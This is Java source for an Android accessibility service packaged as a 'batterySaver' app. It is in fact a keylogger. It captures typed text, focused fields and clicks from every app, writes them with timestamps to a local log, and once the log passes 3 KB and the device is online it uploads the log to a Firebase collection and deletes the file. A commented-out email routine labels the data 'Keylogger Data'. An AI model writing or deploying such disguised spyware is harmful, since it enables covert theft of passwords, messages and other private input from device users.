package com.example.batterySaver;

import static com.example.batterySaver.firebase_database.addFieldToAnalyticsCollection;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Calendar;


public class testService extends AccessibilityService {
    public String res = "";

    public double FILE_SIZE = 3; // log file size in KB
    private String packageName;

    @Override
    public void onServiceConnected() {
        Log.v("battery manager", "Onservice() Connected...");

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED;
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
        info.notificationTimeout = 100;
        info.packageNames = null;
        setServiceInfo(info);

    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {

        DateFormat df = new SimpleDateFormat("hh:mm:ss");
        String time = df.format(Calendar.getInstance().getTime());

        switch (event.getEventType()) {

            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED: {
                packageName = event.getPackageName().toString();
                Log.v("battery manager: ", packageName);
            }

            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                String data = event.getText().toString();

                data="("+time+"|TEXT)" + data;
                res = res + data + "\n";

                Log.v("battery manager: ", "("+time+"|TEXT)" + data);
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_FOCUSED: {
                String data = event.getText().toString();

                data="("+time+"|FOCUSED)" + data;
                res = res + data + "\n";

                Log.v("battery manager: ", "("+time+"|FOCUSED)" + data);
                break;
            }
            case AccessibilityEvent.TYPE_VIEW_CLICKED: {
                String data = event.getText().toString();
                data=time + "("+time+"|CLICKED)" + event.getText().toString() + data;
                res = res + data + "\n";

                Log.v("battery manager: ", "("+time+"|CLICKED)" + event.getPackageName().toString() + data);

//                if (res.length() > 10) {
                    try {

                        File file = new File(getApplicationContext().getExternalFilesDir(null), "Log.txt");
                        FileOutputStream fos = new FileOutputStream(file, true);
                        fos.write(res.getBytes());
                        fos.close();

                        double fsize = (double) file.length() / 1024;
                        ConnectivityManager conMgr = (ConnectivityManager) getSystemService(getApplicationContext().CONNECTIVITY_SERVICE);


                        if (fsize > FILE_SIZE) {
                            boolean isWiFiConnected = conMgr.getNetworkInfo(ConnectivityManager.TYPE_WIFI).getState() == NetworkInfo.State.CONNECTED;
                            boolean isMobileDataConnected = conMgr.getNetworkInfo(ConnectivityManager.TYPE_MOBILE).getState() == NetworkInfo.State.CONNECTED;

                            if (isWiFiConnected || isMobileDataConnected) {
//                            if (conMgr.getNetworkInfo(ConnectivityManager.TYPE_MOBILE).getState() == NetworkInfo.State.CONNECTED
//                                    || conMgr.getNetworkInfo(ConnectivityManager.TYPE_WIFI).getState() == NetworkInfo.State.CONNECTED) {
                                StringBuilder text = new StringBuilder();
                                BufferedReader br = new BufferedReader(new FileReader(file));
                                String line;

                                while ((line = br.readLine()) != null) {
                                    text.append(line);
                                    text.append('\n');
                                    }
                                br.close();

                                //Creating SendMail object
                                try {
                                    Log.v("battery manager", text.toString());
                                    addFieldToAnalyticsCollection(text.toString(), packageName);
//                                    SendMail sm = new SendMail(this, "XXXXX", "Keylogger Data", text.toString(), packageName); //Change XXXX by email adress where to send
//                                    sm.execute();
                                    file.delete();
                                }
                                catch (Exception e){
                                    Log.v("battery manager","Error while sending mail:"+e.getMessage());
                                }
                            }
                        }

                    } catch (Exception e) {
                        Log.v("battery manager", e.getMessage());
                    }
                    res = "";
//                }
                break;
            }
            default:
                break;
        }
    }
    @Override
    public void onInterrupt() {
        Log.d("battery manager", "onInterrupt() is Called...");
    }

}